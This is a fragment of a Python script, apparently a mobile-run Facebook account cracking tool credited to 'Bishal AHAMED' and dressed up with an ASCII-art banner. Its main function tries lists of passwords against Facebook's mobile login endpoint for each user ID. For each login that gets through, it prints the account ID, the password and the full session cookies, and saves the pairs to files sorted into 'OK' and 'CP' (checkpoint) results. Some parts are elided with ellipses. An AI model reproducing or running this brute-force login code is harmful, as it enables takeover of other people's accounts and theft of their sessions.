...
time.sleep(1)
os.system('clear')
print('\033[1;32m [+]\033[1;37m UPDATE DONE \033[1;32m\033[1;37m BISHAL IS A BRAND NOT A NAME')
time.sleep(2)
user=[]
ok=[]
cp=[]
...
▒░▒   ░  ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░░ ░ ▒  ░
 ...
 ░       ░        ░   ░  ░  ░      ░  ░    ░  ░
      ░                                                                             
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: Bishal AHAMED
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mTT-CYBER-Bishal
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;95mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;95mPREMIUM
\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m0.1.0
\033[1;96m═════════════════════════════════════════════ """)
...
def htx_cracker(uid,pss):
    ...
    try:
        for ps in pss:
            ...
            sys.stdout.write(f'\r \033[1;34m[BISHAL]\033[1;93m[{tl}]\033[1;97m[{loop}]\033[1;92m[OK-{len(ok)}]\r')
            sys.stdout.flush()
            ua=tst()
           ...
           'viewport-width': '980',
            ...
            lo = session.post('https://mbesic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f' \033[38;5;46m[BISHAL-OK] {idf} | {ps}\n\033[1;37m=[🐻‍\033[1;37m]= \033[38;5;46m{coki}')
                open('/sdcard/BISHAL-OK.txt','a').write(idf+'|'+ps+'\n')
                ok.append(idf)
                break
                ...
                idf = "1000"+coki1[0:11]
                print(f' \033[1;31m[BISHAL-CP] {idf} | {ps}')
                open('/sdcard/BISHAL-CP','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
